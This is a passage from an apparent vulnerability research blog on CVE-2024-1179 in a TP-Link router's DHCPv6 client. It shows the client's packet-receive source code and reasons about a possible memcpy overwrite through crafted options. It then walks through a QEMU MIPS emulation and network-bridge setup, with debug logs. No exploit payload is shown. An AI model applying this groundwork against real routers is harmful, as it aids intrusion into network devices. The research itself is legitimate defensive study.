</span></span><span style=display:flex><span>	mhdr.msg_controllen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(cmsgbuf);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ((len <span style=color:#f92672>=</span> <span style=color:#a6e22e>recvmsg</span>(sock, <span style=color:#f92672>&amp;</span>mhdr, <span style=color:#ae81ff>0</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_ERR, FNAME, <span style=color:#e6db74>&#34;recvmsg: %s&#34;</span>, <span style=color:#a6e22e>strerror</span>(errno));
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* detect receiving interface */</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (cm <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> cmsghdr <span style=color:#f92672>*</span>)<span style=color:#a6e22e>CMSG_FIRSTHDR</span>(<span style=color:#f92672>&amp;</span>mhdr); cm;
</span></span><span style=display:flex><span>	     cm <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> cmsghdr <span style=color:#f92672>*</span>)<span style=color:#a6e22e>CMSG_NXTHDR</span>(<span style=color:#f92672>&amp;</span>mhdr, cm)) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (cm<span style=color:#f92672>-&gt;</span>cmsg_level <span style=color:#f92672>==</span> IPPROTO_IPV6 <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>		    cm<span style=color:#f92672>-&gt;</span>cmsg_type <span style=color:#f92672>==</span> IPV6_PKTINFO <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>		    cm<span style=color:#f92672>-&gt;</span>cmsg_len <span style=color:#f92672>==</span> <span style=color:#a6e22e>CMSG_LEN</span>(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> in6_pktinfo))) {
</span></span><span style=display:flex><span>			pi <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> in6_pktinfo <span style=color:#f92672>*</span>)(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)(<span style=color:#a6e22e>CMSG_DATA</span>(cm));
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (pi <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_NOTICE, FNAME, <span style=color:#e6db74>&#34;failed to get packet info&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ((ifp <span style=color:#f92672>=</span> <span style=color:#a6e22e>find_ifconfbyid</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)pi<span style=color:#f92672>-&gt;</span>ipi6_ifindex)) <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_INFO, FNAME, <span style=color:#e6db74>&#34;unexpected interface (%d)&#34;</span>,
</span></span><span style=display:flex><span>		    (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)pi<span style=color:#f92672>-&gt;</span>ipi6_ifindex);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>size_t</span>)len <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#f92672>*</span>dh6)) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_INFO, FNAME, <span style=color:#e6db74>&#34;short packet (%d bytes)&#34;</span>, len);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	dh6 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> dhcp6 <span style=color:#f92672>*</span>)rbuf;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>d_printf</span>(LOG_DEBUG, FNAME, <span style=color:#e6db74>&#34;receive %s from %s on %s&#34;</span>,
</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>dhcp6msgstr</span>(dh6<span style=color:#f92672>-&gt;</span>dh6_msgtype),
</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>addr2str</span>((<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>from), ifp<span style=color:#f92672>-&gt;</span>ifname);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>/* get options */</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>dhcp6_init_options</span>(<span style=color:#f92672>&amp;</span>optinfo);
</span></span><span style=display:flex><span>	p <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> dhcp6opt <span style=color:#f92672>*</span>)(dh6 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	ep <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> dhcp6opt <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)dh6 <span style=color:#f92672>+</span> len);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>dhcp6_get_options</span>(p, ep, <span style=color:#f92672>&amp;</span>optinfo) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_INFO, FNAME, <span style=color:#e6db74>&#34;failed to parse options&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>switch</span>(dh6<span style=color:#f92672>-&gt;</span>dh6_msgtype) {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> DH6_ADVERTISE:
</span></span><span style=display:flex><span>		(<span style=color:#66d9ef>void</span>)<span style=color:#a6e22e>client6_recvadvert</span>(ifp, dh6, len, <span style=color:#f92672>&amp;</span>optinfo);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> DH6_REPLY:
</span></span><span style=display:flex><span>		(<span style=color:#66d9ef>void</span>)<span style=color:#a6e22e>client6_recvreply</span>(ifp, dh6, len, <span style=color:#f92672>&amp;</span>optinfo);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>d_printf</span>(LOG_INFO, FNAME, <span style=color:#e6db74>&#34;received an unexpected message (%s) &#34;</span>
</span></span><span style=display:flex><span>		    <span style=color:#e6db74>&#34;from %s&#34;</span>, <span style=color:#a6e22e>dhcp6msgstr</span>(dh6<span style=color:#f92672>-&gt;</span>dh6_msgtype),
</span></span><span style=display:flex><span>		    <span style=color:#a6e22e>addr2str</span>((<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>from));
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>dhcp6_clear_options</span>(<span style=color:#f92672>&amp;</span>optinfo);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can easily guess here that the <code>p</code> pointer that get passed to <code>dhcp6_get_options</code> is indeed the pointer to the beginning of all DHCPv6 options raw data contains in the packets. We will confirm it later through dynamic analysis. So, if we can control how <code>p</code> is constructed, we can control the source and size argument of <code>memcpy</code>, and since we can write many times with destination pointer growing, we can potentially overwrite subsequent data. Let&rsquo;s switch to dynamic analysis, to analyze how <code>p</code> is constructed and how we can tweak it. But first, we need to set up our environment.</p><h4 id=dynamic-analysis>Dynamic analysis<a href=#dynamic-analysis class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4><h5 id=environment-setup>Environment setup<a href=#environment-setup class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h5><p>At the beginning, we wanted a full system emulation using QEMU. On the ZDI blog we found this <a href=https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu>blog post</a> which helps us to build our environment. We build our environment by downloading <code>vmlinux-3.2.0-4-4kc-malta</code> kernel and <code>debian_wheezy_mipsel_standard.qcow2</code> images. Then we use the following command line to start the Qemu VM (Virtual Machine).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span style=color:#e6db74>&#34;root=/dev/sda1 console=tty0&#34;</span> -net user,hostfwd<span style=color:#f92672>=</span>tcp::80-:80,hostfwd<span style=color:#f92672>=</span>tcp::443-:443,hostfwd<span style=color:#f92672>=</span>tcp::2222-:22 -net nic -nographic
</span></span></code></pre></div><p>Once in the Qemu VM, we use <code>scp</code> to transfer the Squashfs file system into the VM (we zipped it first and unzipped it once in the VM) and then we follow the next steps described in the ZDI blog post :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cd squashfs-root/
</span></span><span style=display:flex><span>mount -o bind /sys/ sys/
</span></span><span style=display:flex><span>mount -o bind /proc/ proc/
</span></span><span style=display:flex><span>mount -o bind /dev/ dev/
</span></span><span style=display:flex><span>chroot . /bin/sh
</span></span></code></pre></div><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023111922.png><figcaption><h4></h4></figcaption></figure><p>We then check the <code>inittab</code> file to know how to start the router. According to this file, we need to execute the <code>/etc/init.d/rcS</code> file to start the router. But we didn&rsquo;t find such file.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016184850.png><figcaption><h4></h4></figcaption></figure><p>After digging into the file system, we found that it was an OpenWrt based router.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241016195946.png><figcaption><h4></h4></figcaption></figure><p>We found online the boot process of an OpenWRT based router: <a href=https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d>https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span> <span style=color:#f92672>/</span>init <span style=color:#f92672>-</span> <span style=color:#f92672>&gt;</span> <span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>init <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>preinit <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>procd <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>/</span>etc<span style=color:#f92672>/</span>rc.d<span style=color:#75715e>/*
</span></span></span></code></pre></div><p>So, we run the <code>/sbin/init</code> binary , but it seems not to start everything.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>or directory.
</span></span><span style=display:flex><span>cp: can<span style=color:#e6db74>&#39;t stat &#39;</span>/etc/avahi/services/http.service<span style=color:#e6db74>&#39;: No such file or directory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>cp: can&#39;</span>t stat <span style=color:#e6db74>&#39;/etc/avahi/services/ssh.service&#39;</span>: No such file or directory
</span></span><span style=display:flex><span>cp: can<span style=color:#e6db74>&#39;t stat &#39;</span>/etc/config/https-dns-proxy<span style=color:#e6db74>&#39;: No such file or directory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>cp: can&#39;</span>t stat <span style=color:#e6db74>&#39;/etc/config/openvpn-mgmt&#39;</span>: No such file or directory
</span></span><span style=display:flex><span>cp: can<span style=color:#e6db74>&#39;t stat &#39;</span>/etc/config/portal-mgmt<span style=color:#e6db74>&#39;: No such file or directory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>cp: can&#39;</span>t stat <span style=color:#e6db74>&#39;/etc/ndppd.conf&#39;</span>: No such file or directory
</span></span><span style=display:flex><span>cp: can<span style=color:#e6db74>&#39;t stat &#39;</span>/etc/uhttpd.crt<span style=color:#e6db74>&#39;: No such file or directory
</span></span></span><span style=display:flex><span><span style=color:#e6db74>cp: can&#39;</span>t stat <span style=color:#e6db74>&#39;/etc/uhttpd.key&#39;</span>: No such file or directory
</span></span><span style=display:flex><span>Saved
</span></span></code></pre></div><p>As the advisory doesn&rsquo;t specify that a specific configuration is required to trigger the vulnerability, we decide to directly launch the <code>dhcp6c</code> client binary without emulating the full router. But we encounter an issue : <code>setsockopt SO_REUSEPORT not available</code>.
We later found that to fix this issue, we need a kernel version greater or equal to <code>3.9</code>:</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241017234659.png><figcaption><h4></h4></figcaption></figure><p>Debian Jessie was using kernel version 3.16, so we get an old kernel <a href=http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/vmlinux-3.16.0-6-4kc-malta>vmlinux-3.16.0-6-4kc-malta</a>, and readjust the Qemu startup script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo qemu-system-mipsel -M malta -kernel vmlinux-3.16.0-6-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span style=color:#e6db74>&#34;root=/dev/sda1 console=tty0&#34;</span> -net user,hostfwd<span style=color:#f92672>=</span>tcp::80-:80,hostfwd<span style=color:#f92672>=</span>tcp::443-:443,hostfwd<span style=color:#f92672>=</span>tcp::2222-:22 -net nic -nographic
</span></span></code></pre></div><p>And then try to run the <code>dhcp6c</code> binary. It works.</p><pre tabindex=0><code>/ # /usr/sbin/dhcp6c 
usage: dhcp6c [-c configfile] [-dDfi] [-p pid-file] [ -v vendor ] interface [interfaces...]
</code></pre><p>It works fine. It prints to us how to use the binary. We can see that we could pass a configuration file to it. We also need to specify the interface to use, it is mandatory.
To understand more how to use it, we search on internet and we see that there is also the options (<code>-dDf</code>) to print log and debugging messages (<a href="https://man.freebsd.org/cgi/man.cgi?query=dhcp6c">https://man.freebsd.org/cgi/man.cgi?query=dhcp6c</a>) and start it in foreground mode.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023120028.png><figcaption><h4></h4></figcaption></figure><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241023120419.png><figcaption><h4></h4></figcaption></figure><p>The <code>-i</code> option starts the binary with the specific configuration where the client broadcast an <code>Information-request</code> dhcp message and print log on stdout (confirmed after via wireshark).
We then start the binary with <code>-dDfi</code> options:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/ <span style=color:#75715e># /usr/sbin/dhcp6c -dDfi</span>
</span></span><span style=display:flex><span>usage: dhcp6c <span style=color:#f92672>[</span>-c configfile<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-dDfi<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-p pid-file<span style=color:#f92672>]</span> <span style=color:#f92672>[</span> -v vendor <span style=color:#f92672>]</span> interface <span style=color:#f92672>[</span>interfaces...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/ <span style=color:#75715e># /usr/sbin/dhcp6c -dDfi eth0</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: gethwid: found an interface eth0 <span style=color:#66d9ef>for</span> DUID
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: get_duid: generated a new DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: client6_init: failed initialize control message authentication
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: client6_init: skip opening control port
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: client6_init: client6_init <span style=color:#ae81ff>502</span> client6_init succeed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>client6_init <span style=color:#ae81ff>503</span> client6_init succeed
</span></span><span style=display:flex><span>Oct/27/2024 13:53:48: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>INIT, timeo<span style=color:#f92672>=</span>0, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>680</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: client6_send: a new XID <span style=color:#f92672>(</span>a75986<span style=color:#f92672>)</span> is generated
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: client6_send: send information request to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>INFOREQ, timeo<span style=color:#f92672>=</span>0, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: dhcp6_get_options: get DHCP option client ID, len <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style=display:flex><span>Oct/27/2024 13:53:49: client6_recvreply: no server ID option
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: client6_send: send information request to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>INFOREQ, timeo<span style=color:#f92672>=</span>1, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>1959</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: dhcp6_get_options: get DHCP option client ID, len <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style=display:flex><span>Oct/27/2024 13:53:50: client6_recvreply: no server ID option
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: client6_send: send information request to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>INFOREQ, timeo<span style=color:#f92672>=</span>2, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>3732</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: client6_recv: receive reply from fec0::2 on eth0
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: dhcp6_get_options: get DHCP option client ID, len <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52:   DUID: 00:03:00:01:52:54:00:12:34:56
</span></span><span style=display:flex><span>Oct/27/2024 13:53:52: client6_recvreply: no server ID option
</span></span></code></pre></div><p>We can see some debugging information. In particular we can see a call to <code>dhcp_get_options</code> and <code>client6_recv</code>, which confirms that using OPNsense project code for analysis was a good idea and we are on right path.
However, in the current configuration, the binary uses the default Qemu user networking stack, so we are using the Qemu internal DHCP server which is not under our control. As we are attacking an dhcp6 client we need to have a DHCPv6 server that can send response to each DHCPv6 requests sent by the client. So as mentioned in the advisory attacker needs to be network adjacent to the router to be able to send a DHCPv6 messages. We will simulate this configuration using Qemu and network bridge.</p><p>The first thing we need to do is to transfer a prebuilt statically linked <a href=https://github.com/stayliv3/gdb-static-cross/blob/master/prebuilt/gdbserver-7.7.1-mipsel-mips32-v1>gdbserver</a> to the qemu environment so we can easily debug the binary from our host.</p><p>Now we are going to simulate an environment where our host will be network adjacent to the router. The qemu VM will act as the router.
We will create a network bridge that allows the qemu virtual machine to communicate with our host system and the outside network. It&rsquo;s like the qemu VM representing the router and our host machine are connected to a switch and this switch is connected to the internet.
We then came up with the following bash script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>sudo ip link set br0 down
</span></span><span style=display:flex><span>sudo brctl delbr br0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo ifconfig enp0s31f6 down
</span></span><span style=display:flex><span>sudo brctl addbr br0
</span></span><span style=display:flex><span>sudo brctl addif br0 enp0s31f6
</span></span><span style=display:flex><span>sudo ifconfig br0 0.0.0.0 promisc up
</span></span><span style=display:flex><span>sudo ifconfig enp0s31f6 0.0.0.0 promisc up
</span></span><span style=display:flex><span>sudo dhclient br0
</span></span><span style=display:flex><span>sudo tunctl -t tap0
</span></span><span style=display:flex><span>sudo brctl addif br0 tap0
</span></span><span style=display:flex><span>sudo ifconfig tap0 0.0.0.0 promisc up
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo qemu-system-mipsel <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-M malta -kernel vmlinux-3.16.0-6-4kc-malta <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-hda debian_wheezy_mipsel_standard.qcow2 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-append <span style=color:#e6db74>&#34;root=/dev/sda1&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-net nic,macaddr<span style=color:#f92672>=</span>00:11:22:33:44:55 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-net tap,ifname<span style=color:#f92672>=</span>tap0,script<span style=color:#f92672>=</span>no,downscript<span style=color:#f92672>=</span>no <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-nographic
</span></span></code></pre></div><p>Let&rsquo;s explain:</p><ol><li>Cleanup Previous Configuration</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo ip link set br0 down
</span></span><span style=display:flex><span>sudo brctl delbr br0
</span></span></code></pre></div><p>If a network bridge named <code>br0</code> already exists, this brings it down and deletes it to ensure no conflicts when creating a new bridge.</p><ol start=2><li>Set Up Physical Network Interface for Bridging</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo ifconfig enp0s31f6 down
</span></span><span style=display:flex><span>sudo brctl addbr br0
</span></span><span style=display:flex><span>sudo brctl addif br0 enp0s31f6
</span></span></code></pre></div><p>Bring down our physical network interface <code>enp0s31f6</code> and add it to a new bridge interface <code>br0</code>.</p><ol start=3><li>Configure <code>br0</code> and <code>enp0s31f6</code> Interfaces</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo ifconfig br0 0.0.0.0 promisc up
</span></span><span style=display:flex><span>sudo ifconfig enp0s31f6 0.0.0.0 promisc up
</span></span><span style=display:flex><span>sudo dhclient br0
</span></span></code></pre></div><p>These commands activate the bridge and physical interface in promiscuous mode (allowing them to handle all network traffic, not just those addressed to them directly) and request an IP address from our network&rsquo;s DHCP server. (FAI)</p><ol start=4><li>Create and Configure Virtual Network Interface (<code>tap0</code>)</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo tunctl -t tap0
</span></span><span style=display:flex><span>sudo brctl addif br0 tap0
</span></span><span style=display:flex><span>sudo ifconfig tap0 0.0.0.0 promisc up
</span></span></code></pre></div><p>This creates a TAP interface (virtual network adapter) and connects it to our bridge</p><ol start=5><li>Launch QEMU</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo qemu-system-mipsel <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -M malta -kernel vmlinux-3.16.0-6-4kc-malta <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -hda debian_wheezy_mipsel_standard.qcow2 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -append <span style=color:#e6db74>&#34;root=/dev/sda1&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -net nic,macaddr<span style=color:#f92672>=</span>00:11:22:33:44:55 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -net tap,ifname<span style=color:#f92672>=</span>tap0,script<span style=color:#f92672>=</span>no,downscript<span style=color:#f92672>=</span>no <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>    -nographic
</span></span></code></pre></div><ul><li><strong>Emulation and Machine Options</strong>:<ul><li><code>-M malta</code>: Specifies the MIPS Malta development board emulation.</li><li><code>-kernel vmlinux-3.16.0-6-4kc-malta</code>: Uses 3.16 Linux kernel.</li><li><code>-hda debian_wheezy_mipsel_standard.qcow2</code>: Specifies the disk image for the VM.</li><li><code>-append "root=/dev/sda1"</code>: Sets the root filesystem to <code>/dev/sda1</code>.</li></ul></li><li><strong>Networking</strong>:<ul><li><code>-net nic,macaddr=00:11:22:33:44:55</code>: Creates a network device with a specified MAC address.</li><li><code>-net tap,ifname=tap0,script=no,downscript=no</code>: Sets up a TAP network backend using <code>tap0</code> for connectivity.</li></ul></li></ul><p>After running this script and letting the qemu VM boot, we inspect our host network configuration with <code>ifconfig</code> command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>~$ ip a
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>. 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>2: enp0s31f6: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>1500</span> qdisc pfifo_fast master br0 state UP group default qlen <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>    link/ether 38:f7:cd:c4:d9:99 brd ff:ff:ff:ff:ff:ff
</span></span><span style=display:flex><span>
